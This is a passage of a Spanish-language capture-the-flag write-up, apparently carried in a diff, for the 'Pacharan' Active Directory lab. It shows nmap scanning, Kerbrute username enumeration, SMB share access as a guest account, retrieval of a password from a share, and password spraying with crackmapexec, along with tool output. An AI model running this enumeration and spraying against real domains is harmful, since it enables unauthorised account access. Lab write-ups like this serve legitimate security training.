+</span></span><span style="display:flex;"><span>49670/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49673/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49676/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49691/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>60909/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_clock-skew: -1h01m36s
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-02-24T18:30:15
+</span></span><span style="display:flex;"><span>|_  start_date: 2025-02-24T12:10:46
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 69.43 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Bien, confirmamos que estamos contra un <strong>AD</strong> y podemos ver que el <strong>servicio SMB</strong> parece necesitar credenciales para poder entrar. Además, parece que hubo un problema para escanear el <strong>puerto 53</strong> que pertenece al <strong>servicio DNS</strong>. Por lo que yo empezaría por el <strong>puerto 88</strong> que es <strong>servicio Kerberos</strong>.</p>
+<p>También pudimos ver el dominio del <strong>AD</strong>, este lo puedes registrar en el <code>/etc/hosts</code> quedando de la siguiente manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.69.69 PACHARAN.THL
+</span></span></code></pre></div><p>Con esto listo, continuemos.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="Kerberos">Enumeración de Usuarios del Servicio Kerberos</h3>
+<p>Necesitaremos comprobar si podemos usar un usuario X para poder ver y listar los recursos compartidos del <strong>servicio SMB</strong>.</p>
+<p>Pero como no tenemos ningún usuario, vamos a tratar de obtener algunos con la herramienta <strong>Kerbrute</strong>.</p>
+<p>Usaremos su función de enumeración de usuarios y un wordlists que contenga usuarios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./kerbrute_linux_amd64 userenum -d PACHARAN.THL --dc 192.168.69.69 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __             __               __     
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 02/24/25 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/02/24 13:48:32 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>2025/02/24 13:48:32 &gt;  	192.168.69.69:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/02/24 13:48:37 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 chivas@PACHARAN.THL
+</span></span><span style="display:flex;"><span>2025/02/24 13:49:04 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 hendrick@PACHARAN.THL
+</span></span><span style="display:flex;"><span>2025/02/24 13:49:07 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 whisky@PACHARAN.THL
+</span></span><span style="display:flex;"><span>2025/02/24 13:49:11 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 gordons@PACHARAN.THL
+</span></span><span style="display:flex;"><span>2025/02/24 13:49:34 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 redlabel@PACHARAN.THL
+</span></span><span style="display:flex;"><span>2025/02/24 13:49:49 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 beefeater@PACHARAN.THL
+</span></span><span style="display:flex;"><span>2025/02/24 13:49:53 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 Chivas@PACHARAN.THL
+</span></span><span style="display:flex;"><span>2025/02/24 13:50:28 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 invitado@PACHARAN.THL
+</span></span><span style="display:flex;"><span>2025/02/24 13:55:35 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	 administrador@PACHARAN.THL
+</span></span></code></pre></div><p>Encontramos varios usuarios. Te recomiendo que los guardes en un archivo de texto, por si los tenemos que usar más adelante.</p>
+<p>Podríamos probar con cualquiera, pero el único que nos va a funcionar es el <strong>usuario invitado</strong>.</p>
+<p>Comprobémoslo con <strong>smbmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.69.69 -d PACHARAN.THL -u <span style="color:#e6db74">&#39;invitado&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                          
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	ADMIN$                                            	NO ACCESS	Admin remota
+</span></span><span style="display:flex;"><span>	C$                                                	NO ACCESS	Recurso predeterminado
+</span></span><span style="display:flex;"><span>	IPC$                                              	READ ONLY	IPC remota
+</span></span><span style="display:flex;"><span>	NETLOGON                                          	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>	NETLOGON2                                         	READ ONLY	
+</span></span><span style="display:flex;"><span>	PACHARAN                                          	NO ACCESS	
+</span></span><span style="display:flex;"><span>	PDF Pro Virtual Printer                           	NO ACCESS	Soy Hacker y arreglo impresoras
+</span></span><span style="display:flex;"><span>	print$                                            	NO ACCESS	Controladores de impresora
+</span></span><span style="display:flex;"><span>	SYSVOL                                            	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>	Users                                             	NO ACCESS	
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Funciona bien. Bastante curioso ese recurso llamado <code>PDF Pro Virtual Printer</code>, más que nada por su descripción.</p>
+<p>Veamos que podemos encontrar.</p>
+<h3 id="SMB">Enumeración de Servicio SMB</h3>
+<p>Antes que nada, podemos comprobar que este servicio necesita credenciales para poder ver los recursos compartidos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.69.69
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PACHARAN.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Ahí nos dice que esta activado el login.</p>
+<p>Ya vimos que el <strong>usuario invitado</strong> puede ver el contenido del <strong>directorio NETLOGON2</strong>.</p>
+<p>Veamos qué hay dentro:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.69.69 -d PACHARAN.THL -u <span style="color:#e6db74">&#39;invitado&#39;</span> -r NETLOGON2
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	ADMIN$                                            	NO ACCESS	Admin remota
+</span></span><span style="display:flex;"><span>	C$                                                	NO ACCESS	Recurso predeterminado
+</span></span><span style="display:flex;"><span>	IPC$                                              	READ ONLY	IPC remota
+</span></span><span style="display:flex;"><span>	NETLOGON                                          	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>	NETLOGON2                                         	READ ONLY	
+</span></span><span style="display:flex;"><span>	./NETLOGON2
+</span></span><span style="display:flex;"><span>	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Jul <span style="color:#ae81ff">31</span> 11:25:34 2024	.
+</span></span><span style="display:flex;"><span>	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Jul <span style="color:#ae81ff">31</span> 11:25:34 2024	..
+</span></span><span style="display:flex;"><span>	fr--r--r--               <span style="color:#ae81ff">22</span> Wed Jul <span style="color:#ae81ff">31</span> 11:25:55 2024	Orujo.txt
+</span></span><span style="display:flex;"><span>	PACHARAN                                          	NO ACCESS
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span></code></pre></div><p>Hay un archivo de texto.</p>
+<p>Vamos a descargarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.69.69 -d PACHARAN.THL -u <span style="color:#e6db74">&#39;invitado&#39;</span> --download NETLOGON2/Orujo.txt
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting download: NETLOGON2<span style="color:#ae81ff">\O</span>rujo.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">22</span> bytes<span style="color:#f92672">)</span>                                                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File output to: /../TheHackersLabs/Pacharan/content/192.168.69.69-NETLOGON2_Orujo.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Veamos que contiene este archivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat 192.168.69.69-NETLOGON2_Orujo.txt
+</span></span><span style="display:flex;"><span>Pericodelospalotes6969
+</span></span></code></pre></div><p>Parece ser una contraseña.</p>
+<p>Podríamos comprobar si esta contraseña es de algún usuario que ya tenemos.</p>
+<p>Podemos aplicar <strong>password spraying</strong> con <strong>crackmapexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.69.69 -u users.txt -p <span style="color:#e6db74">&#39;Pericodelospalotes6969&#39;</span> --no-brute --continue-on-success
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PACHARAN.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\c</span>hivas:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\h</span>endrick:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\w</span>hisky:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\g</span>ordons:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\r</span>edlabel:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\b</span>eefeater:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\i</span>nvitado:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\a</span>dministrador:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\:</span>Pericodelospalotes6969
+</span></span></code></pre></div><p>Parece que no pertenece a ninguno.</p>
+<p>Quizá el nombre del archivo es el nombre de un usuario. Vamos a comprobarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.69.69 -u <span style="color:#e6db74">&#39;Orujo&#39;</span> -p <span style="color:#e6db74">&#39;Pericodelospalotes6969&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:WIN-VRU3GG3DPLJ<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PACHARAN.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.69.69   <span style="color:#ae81ff">445</span>    WIN-VRU3GG3DPLJ  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PACHARAN.THL<span style="color:#ae81ff">\O</span>rujo:Pericodelospalotes6969
+</span></span></code></pre></div><p>En efecto, es un usuario.</p>
+<p>Veamos que puede ver este usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.69.69 -d PACHARAN.THL -u <span style="color:#e6db74">&#39;Orujo&#39;</span> -p <span style="color:#e6db74">&#39;Pericodelospalotes6969&#39;</span>
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|---|---|---|---|---|---|---|
